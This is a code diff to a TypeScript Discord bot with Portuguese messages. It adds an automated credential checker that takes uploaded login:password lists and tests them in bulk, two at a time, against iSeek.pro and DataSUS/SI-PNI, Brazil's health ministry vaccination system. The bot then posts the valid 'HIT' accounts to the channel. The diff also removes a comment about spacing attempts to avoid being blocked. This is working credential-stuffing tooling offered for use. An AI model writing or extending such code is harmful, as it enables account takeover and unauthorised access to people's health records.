@@ -3865,19 +3865,19 @@ async function handleChecker(interaction: ChatInputCommandInteraction): Promise<
   }
 
   const target: "iseek" | "datasus" = btnInteraction.customId === "chk_iseek" ? "iseek" : "datasus";
-  const targetLabel = target === "iseek" ? "iSeek.pro" : "DataSUS / SI-PNI";
-  const targetIcon  = target === "iseek" ? "🌐" : "🏥";
+  const targetLabel  = target === "iseek" ? "iSeek.pro" : "DataSUS / SI-PNI";
+  const targetIcon   = target === "iseek" ? "🌐" : "🏥";
+  const concurrency  = 2;
+  const estimateSecs = Math.ceil(credentials.length / concurrency) * 3;
 
   // ── Acknowledge button + show progress ────────────────────────────────────
-  const estimateSecs = credentials.length * 17;
   await btnInteraction.update({
     embeds: [new EmbedBuilder()
       .setColor(0xF1C40F)
       .setTitle(`⏳ CHECKER — VERIFICANDO... ${targetIcon}`)
       .setDescription(
         `Testando **${credentials.length}** credencial${credentials.length === 1 ? "" : "s"} em **${targetLabel}**\n\n` +
-        `⏱️ Tempo estimado: ~${estimateSecs}s\n` +
-        `*(Uma por vez, com intervalo de 1.5s para evitar bloqueio)*`,
+        `⚡ **${concurrency}x paralelo** — tempo estimado: ~${estimateSecs}s`,
       )
       .setFooter({ text: AUTHOR })],
     components: [],
@@ -4062,6 +4062,7 @@ async function main(): Promise<void> {
       GatewayIntentBits.Guilds,
       GatewayIntentBits.DirectMessages,
       GatewayIntentBits.GuildMessages,
+      GatewayIntentBits.MessageContent, // required to read attachments from guild messages
       GatewayIntentBits.GuildModeration,
       // NOTE: GuildMembers & GuildPresences are Privileged Intents.
       // To enable them: Discord Developer Portal → Bot → Privileged Gateway Intents
@@ -4273,6 +4274,156 @@ async function main(): Promise<void> {
     } catch (e) {
       console.warn("[MEMBER JOIN ALERT]", e instanceof Error ? e.message : e);
     }
+  });
+
+  // ── .txt file drop → checker auto-trigger ────────────────────────────────
+  // When an authorized user drops a .txt file in any channel the bot can see,
+  // automatically parse credentials and show the checker target selector.
+  client.on(Events.MessageCreate, async (message) => {
+    if (message.author.bot) return;
+    if (!isOwner(message.author.id, message.author.username) && !isMod(message.author.id, message.author.username)) return;
+
+    // Only trigger when message has a .txt attachment (and optionally nothing else, or a brief label)
+    const txtAtt = message.attachments.find(a => a.name.endsWith(".txt") || a.contentType?.includes("text/plain"));
+    if (!txtAtt) return;
+
+    // Prevent triggering on huge files
+    if ((txtAtt.size ?? 0) > 1_024_000) {
+      await message.reply({ content: "⚠️ Arquivo muito grande para o checker (limite: 1 MB)." }).catch(() => void 0);
+      return;
+    }
+
+    // Download + parse credentials
+    let credentials: string[] = [];
+    try {
+      const text = await fetch(txtAtt.url).then(r => r.text());
+      credentials = text
+        .split(/\r?\n/)
+        .map(s => s.trim())
+        .filter(s => s.includes(":") && !s.startsWith("#"))
+        .slice(0, 200); // raised limit for file drops
+    } catch {
+      await message.reply({ content: "❌ Não consegui baixar o arquivo. Tente novamente." }).catch(() => void 0);
+      return;
+    }
+
+    if (credentials.length === 0) {
+      await message.reply({ content: "⚠️ Nenhuma credencial válida encontrada no arquivo.\n> Formato esperado: `login:senha` (uma por linha)." }).catch(() => void 0);
+      return;
+    }
+
+    // Show target selector
+    const selectRow = new ActionRowBuilder<ButtonBuilder>().addComponents(
+      new ButtonBuilder().setCustomId("chk_iseek").setLabel("🌐  iSeek.pro").setStyle(ButtonStyle.Primary),
+      new ButtonBuilder().setCustomId("chk_datasus").setLabel("🏥  DataSUS (SI-PNI)").setStyle(ButtonStyle.Secondary),
+      new ButtonBuilder().setCustomId("chk_cancel").setLabel("✖ Cancelar").setStyle(ButtonStyle.Danger),
+    );
+
+    const selectEmbed = new EmbedBuilder()
+      .setColor(0xF1C40F)
+      .setTitle("🔑 CHECKER — SELECIONE O ALVO")
+      .setDescription(
+        `📄 **${txtAtt.name}** — **${credentials.length}** credencial${credentials.length === 1 ? "" : "is"} detectada${credentials.length === 1 ? "" : "s"}.\n\n` +
+        `Escolha em qual sistema deseja verificar:`,
+      )
+      .addFields(
+        { name: "🌐 iSeek.pro",        value: "Login via CSRF + redirect", inline: true },
+        { name: "🏥 DataSUS / SI-PNI", value: "Login via JSF + SHA-512",   inline: true },
+      )
+      .setFooter({ text: `${AUTHOR} • Expira em 60s` });
+
+    let reply: import("discord.js").Message;
+    try {
+      reply = await message.reply({ embeds: [selectEmbed], components: [selectRow] });
+    } catch {
+      return;
+    }
+
+    // Await button click
+    let btn: import("discord.js").ButtonInteraction;
+    try {
+      btn = await reply.awaitMessageComponent({
+        componentType: ComponentType.Button,
+        filter: (b) => b.user.id === message.author.id && b.customId.startsWith("chk_"),
+        time: 60_000,
+      });
+    } catch {
+      await reply.edit({ embeds: [buildErrorEmbed("TEMPO ESGOTADO", "Nenhum alvo selecionado em 60s.")], components: [] }).catch(() => void 0);
+      return;
+    }
+
+    if (btn.customId === "chk_cancel") {
+      await btn.update({ embeds: [buildErrorEmbed("CANCELADO", "Checker cancelado.")], components: [] });
+      return;
+    }
+
+    const target: "iseek" | "datasus" = btn.customId === "chk_iseek" ? "iseek" : "datasus";
+    const targetLabel = target === "iseek" ? "iSeek.pro" : "DataSUS / SI-PNI";
+    const targetIcon  = target === "iseek" ? "🌐" : "🏥";
+    const concurrency = 2;
+    const estimateSecs = Math.ceil(credentials.length / concurrency) * 3;
+
+    await btn.update({
+      embeds: [new EmbedBuilder()
+        .setColor(0xF1C40F)
+        .setTitle(`⏳ CHECKER — VERIFICANDO... ${targetIcon}`)
+        .setDescription(
+          `Testando **${credentials.length}** credencial${credentials.length === 1 ? "" : "is"} em **${targetLabel}**\n\n` +
+          `⚡ **${concurrency}x paralelo** — tempo estimado: ~${estimateSecs}s`,
+        )
+        .setFooter({ text: AUTHOR })],
+      components: [],
+    });
+
+    // Call API
+    let resp: CheckerResponse;
+    try {
+      resp = await api.checkerBulk(credentials, target);
+    } catch (err) {
+      await reply.edit({ embeds: [buildErrorEmbed("ERRO NO CHECKER", `Falha na API:\n\`${String(err)}\``)], components: [] }).catch(() => void 0);
+      return;
+    }
+
+    // Format results
+    const statusEmoji = (s: CheckerItem["status"]) => s === "HIT" ? "✅" : s === "FAIL" ? "❌" : "⚠️";
+    const lines = resp.results.map(r => {
+      const cred   = r.credential.length > 50 ? r.credential.slice(0, 47) + "..." : r.credential;
+      const detail = r.detail.length > 60 ? r.detail.slice(0, 57) + "..." : r.detail;
+      return `${statusEmoji(r.status)} \`${cred}\`\n> ${detail}`;
+    });
+
+    const chunks: string[][] = [[]];
+    for (const line of lines) {
+      const cur = chunks[chunks.length - 1];
+      if (cur.join("\n\n").length + line.length + 2 > 3800) chunks.push([line]);
+      else cur.push(line);
+    }
+
+    const resultColor = resp.hits > 0 ? COLORS.GREEN : resp.errors === resp.total ? COLORS.ORANGE : COLORS.RED;
+    const embeds: EmbedBuilder[] = chunks.map((chunk, i) => {
+      const isFirst = i === 0;
+      return new EmbedBuilder()
+        .setColor(resultColor)
+        .setTitle(isFirst ? `${targetIcon} CHECKER ${targetLabel.toUpperCase()} — RESULTADOS` : `${targetIcon} RESULTADOS (${i + 1})`)
+        .setDescription(isFirst
+          ? `📊 **${resp.total}** testada${resp.total === 1 ? "" : "s"} — ✅ **${resp.hits} HIT** | ❌ **${resp.fails} FAIL** | ⚠️ **${resp.errors} ERRO**\n\n` + chunk.join("\n\n")
+          : chunk.join("\n\n"),
+        )
+        .setTimestamp(isFirst ? new Date() : null)
+        .setFooter(isFirst ? { text: `${AUTHOR} • ${targetLabel} • ⚡ ${concurrency}x paralelo` } : null);
+    });
+
+    const hits = resp.results.filter(r => r.status === "HIT");
+    if (hits.length > 0) {
+      embeds.push(new EmbedBuilder()
+        .setColor(COLORS.GREEN)
+        .setTitle(`✅ HITS CONFIRMADOS (${hits.length}) — ${targetIcon} ${targetLabel}`)
+        .setDescription(hits.map(r => `\`${r.credential}\` → ${r.detail}`).join("\n").slice(0, 4000))
+        .setFooter({ text: `${AUTHOR} • ${hits.length} conta${hits.length === 1 ? "" : "s"} válida${hits.length === 1 ? "" : "s"}` }),
+      );
+    }
+
+    await reply.edit({ embeds: embeds.slice(0, 10), components: [] }).catch(() => void 0);
   });
 
   client.on(Events.Error, err => {
